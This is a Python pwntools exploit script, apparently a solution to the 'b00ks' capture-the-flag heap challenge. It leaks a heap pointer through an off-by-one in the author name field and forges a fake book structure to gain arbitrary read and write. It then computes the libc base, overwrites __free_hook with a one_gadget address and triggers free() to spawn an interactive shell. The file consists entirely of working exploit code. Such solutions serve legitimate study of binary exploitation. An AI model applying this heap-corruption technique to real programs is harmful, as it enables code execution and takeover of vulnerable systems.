#!/usr/bin/env python
# coding=utf-8
from pwn import *
context.terminal=["tmux","splitw","-h"]
elf = ELF("b00ks")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
a = process("./b00ks")
debug = 0
if debug:
    gdb.attach(a,'''
b *(0x555555554000+0x11cd) 
b *(0x555555554000+0xbbc) 
b *(0x555555554000+0xF53) 
     ''')
#malloc,change,edit
def menu(index):
    a.recvuntil("> ")
    a.sendline(str(index))
def change(name):
    menu(5)
    a.recvuntil("nter author name: ")
    a.sendline(name)

def create(namesize,name,descsize,desc):
    menu(1)
    a.recvuntil(": ")
    a.sendline(str(namesize))
    a.recvuntil("(Max 32 chars): ")
    a.sendline(name)
    a.recvuntil("description size: ")
    a.sendline(str(descsize))
    a.recvuntil("Enter book description: ")
    a.sendline(desc)
def delete(index):
    menu(2)
    a.recvuntil(": ")
    a.sendline(str(index))
def edit(index,desc):
    menu(3)
    a.recvuntil("Enter the book id you want to edit: ")
    a.sendline(str(index))
    a.recvuntil("Enter new book description: ")
    a.sendline(desc)
def printf():
    menu(4)

a.recvuntil(": ")
a.sendline("A"*32)
create(0x40,"A",0x100,'A')#book1
printf()
a.recvuntil("A"*32)
book1_ptr=u64(a.recv(6).ljust(8,'\x00'))
success("book1_ptr ==>0x%x"%book1_ptr)
create(0x21000,'a',0x21000,'a')#book2

fake_book='A'*144
fake_book+=p64(1)
fake_book+=p64(book1_ptr+0x38)
fake_book+=p64(book1_ptr+0x40)
fake_book+=p64(100)

edit(1,fake_book)

change('A'*32)#修改book1的指针
printf()
a.recvuntil("Name: ")
name_ptr=u64(a.recv(6).ljust(8,'\x00'))
success("book2 name_ptr ==>0x%x"%name_ptr)

libc_base=name_ptr-0x5a8010
success("libc_base ==> 0x%x"%libc_base)

one_gadget=libc_base+0x4526a
success("one_gadget ==? 0x%x"%one_gadget)
__free_hook=libc_base+libc.symbols["__free_hook"]
success("__free_hook ==> 0x%x"%__free_hook)

edit(1,p64(__free_hook))

edit(2,p64(one_gadget))

delete(1)
a.interactive()






